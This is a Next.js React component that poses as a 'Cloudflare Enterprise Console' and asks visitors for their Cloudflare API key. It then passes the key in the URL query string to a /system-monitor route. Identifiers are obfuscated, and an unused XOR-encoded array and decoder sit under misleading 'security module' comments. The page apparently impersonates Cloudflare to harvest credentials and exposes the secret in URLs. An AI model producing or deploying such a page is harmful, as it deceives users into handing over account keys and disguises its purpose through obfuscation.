"use client";

// Cloudflare Enterprise CDN Portal
// Analytics and Access Management Module
import { useState } from "react";
import { useRouter } from "next/navigation";

// CF Enterprise security module
const _0xd4f3a = [
  29, 13, 55, 30, 32, 38, 56, 51, 43, 59, 28, 30, 37, 44, 56, 36, 40, 43, 39,
  57,
];

// CF Enterprise validation function
const _0xc7a2b = (_0xf7e9c, _0xe21a3 = 7) =>
  _0xf7e9c.map((c) => String.fromCharCode(c ^ _0xe21a3)).join("");

/**
 * Cloudflare Enterprise Analytics Portal
 * Provides access to CDN distribution analytics and performance metrics
 */
export default function CloudflareEnterprisePortal() {
  const [_0xb9c4f, set_0xb9c4f] = useState(""); // apiKey
  const [_0xe7a2d, set_0xe7a2d] = useState(""); // error
  const router = useRouter();

  // CF Enterprise authentication handler
  const _0xd8e4f = (e) => {
    e.preventDefault();
    if (_0xb9c4f.trim()) {
      // Authenticate with CF Enterprise API
      router.push(`/system-monitor?key=${encodeURIComponent(_0xb9c4f)}`);
    } else {
      set_0xe7a2d("Cloudflare API key is required for analytics access");
    }
  };

  return (
    <div className="min-h-screen flex items-center justify-center bg-gray-900">
      <div className="max-w-md w-full bg-gray-800 p-8 rounded-lg shadow-lg">
        <h1 className="text-2xl font-bold text-blue-500 mb-4">
          Cloudflare Enterprise Console
        </h1>

        <form onSubmit={_0xd8e4f} className="space-y-4">
          <div>
            <label htmlFor="key" className="block text-white mb-2">
              Cloudflare Enterprise API Key
            </label>
            <input
              type="password"
              id="key"
              value={_0xb9c4f}
              onChange={(e) => set_0xb9c4f(e.target.value)}
              className="w-full bg-gray-700 text-white px-4 py-2 rounded"
              placeholder="Enter Cloudflare API key"
            />
          </div>

          {_0xe7a2d && <div className="text-red-400">{_0xe7a2d}</div>}

          <button
            type="submit"
            className="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-2 px-4 rounded"
          >
            Access Enterprise Analytics
          </button>
        </form>

        <div className="mt-6 text-gray-400 text-sm">
          <p>
            This console provides access to Cloudflare Enterprise analytics for
            this website.
          </p>
          <p>
            Only authorized Cloudflare administrators should access this portal.
          </p>
          <p className="mt-2 text-xs">
            Cloudflare Enterprise Edge Network v4.5.7
          </p>
        </div>
      </div>
    </div>
  );
}
